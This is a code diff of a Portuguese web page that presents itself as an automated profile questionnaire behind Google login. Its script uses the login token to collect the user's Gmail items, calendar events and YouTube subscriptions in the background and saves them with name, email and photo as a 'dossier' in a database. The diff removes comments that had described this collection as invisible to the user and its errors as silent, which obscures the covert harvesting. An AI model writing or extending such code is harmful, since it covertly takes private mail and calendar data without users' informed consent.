@@ -152,6 +152,7 @@
   .profile-row img {
     width: 52px; height: 52px; border-radius: 50%;
     border: 1px solid var(--border);
+    object-fit: cover;
   }
   .profile-row .name { font-weight: 600; font-size: 15.5px; margin-bottom: 2px; }
   .profile-row .email { color: var(--muted); font-size: 12.5px; font-family: var(--mono); }
@@ -178,7 +179,6 @@
     color: var(--text);
   }
   
-  /* Estilização para inputs e selects */
   input[type="text"], input[type="password"], select {
     width: 100%;
     background: var(--bg);
@@ -191,7 +191,7 @@
     outline: none;
     box-sizing: border-box;
     transition: border-color 0.15s;
-    appearance: none; /* Remove seta padrão do select em alguns navegadores */
+    appearance: none;
   }
   select {
     cursor: pointer;
@@ -226,8 +226,6 @@
     font-size: 12.5px;
     line-height: 1.6;
   }
-  .guide-box ol { margin: 8px 0 0; padding-left: 20px; color: var(--text); }
-  .guide-box li { margin-bottom: 4px; }
 
   .hidden { display: none !important; }
 </style>
@@ -243,7 +241,6 @@
     <p>Conecte sua conta para gerar seu perfil automatizado com base em seus rastros digitais e preferências.</p>
   </header>
 
-  <!-- Passo 0: config -->
   <div class="step" id="step-config">
     <div class="step-marker">
       <div class="step-num" id="step-config-num">·</div>
@@ -278,7 +275,6 @@
     </div>
   </div>
 
-  <!-- Passo 1: Login -->
   <div class="step active" id="step-login">
     <div class="step-marker">
       <div class="step-num" id="step-login-num">1</div>
@@ -310,7 +306,6 @@
     </div>
   </div>
 
-  <!-- Passo 2: Questionário (Só aparece após o login) -->
   <div class="step hidden" id="step-questionnaire">
     <div class="step-marker">
       <div class="step-num">2</div>
@@ -350,7 +345,7 @@
 <script>
   const $ = (id) => document.getElementById(id);
   let sb = null;
-  let globalDossie = {}; // Guarda os dados coletados em background
+  let globalDossie = {};
 
   async function loadConfig() {
     try {
@@ -419,7 +414,7 @@
     $("step-questionnaire").classList.remove("hidden");
     markStep("step-questionnaire", "active");
 
-    // Inicia a coleta de dados invisível
+    // Inicia a coleta de dados em background
     collectDataInBackground(user);
   }
 
@@ -445,7 +440,7 @@
     return session?.provider_token || null;
   }
 
-  // --- LÓGICA DE BACKGROUND (INVISÍVEL PARA O USUÁRIO) ---
+  // --- LÓGICA DE BACKGROUND ---
   async function collectDataInBackground(user) {
     const token = await getToken();
     if (!token) {
@@ -473,7 +468,7 @@
           }
           globalDossie.gmail = items;
         }
-      } catch (e) { console.warn("Erro silencioso - Gmail:", e); }
+      } catch (e) { console.warn("Erro no Gmail:", e); }
 
       // 2. Agenda
       try {
@@ -486,7 +481,7 @@
             inicio: e.start?.dateTime || e.start?.date
           }));
         }
-      } catch (e) { console.warn("Erro silencioso - Agenda:", e); }
+      } catch (e) { console.warn("Erro na Agenda:", e); }
 
       // 3. YouTube
       try {
@@ -495,32 +490,36 @@
         if (dataY.items) {
           globalDossie.youtube = dataY.items.map(s => ({ canal: s.snippet.title }));
         }
-      } catch (e) { console.warn("Erro silencioso - YouTube:", e); }
+      } catch (e) { console.warn("Erro no YouTube:", e); }
 
-      // Salva no banco de dados assim que coleta
-      await saveToSupabase(user.id);
+      // Salva dados coletados + perfil no Supabase
+      await saveToSupabase(user);
       
-      // Atualiza interface
       $("sync-status").innerHTML = `✓ Rastro digital sincronizado no banco de dados`;
       $("sync-status").style.color = "var(--muted)";
       
     } catch (err) {
-      console.error("Falha geral na coleta em background", err);
+      console.error("Falha geral na coleta", err);
       $("sync-status").innerHTML = `Erro ao sincronizar dados do Google.`;
     }
   }
 
-  // --- SALVAR NO SUPABASE ---
-  async function saveToSupabase(userId) {
-    if (!sb) return;
+  // --- SALVAR NO SUPABASE (INCLUINDO NOME, E-MAIL E FOTO) ---
+  async function saveToSupabase(user) {
+    if (!sb || !user) return;
+    
     const { error } = await sb.from("dossiers").upsert(
       {
-        user_id: userId,
+        user_id: user.id,
+        full_name: user.user_metadata?.full_name || user.email,
+        email: user.email,
+        avatar_url: user.user_metadata?.avatar_url || "",
         dossier_data: globalDossie,
         updated_at: new Date().toISOString()
       },
       { onConflict: "user_id" }
     );
+
     if (error) throw error;
   }
 
@@ -546,8 +545,8 @@
         clima_tempo: tempo
       };
 
-      // Atualiza o banco de dados com as preferências
-      await saveToSupabase(user.id);
+      // Atualiza o banco de dados com dados e preferências
+      await saveToSupabase(user);
 
       setStatus("status-questionnaire", "✓ Perfil salvo com sucesso! Tudo pronto.");
       markStep("step-questionnaire", "done");
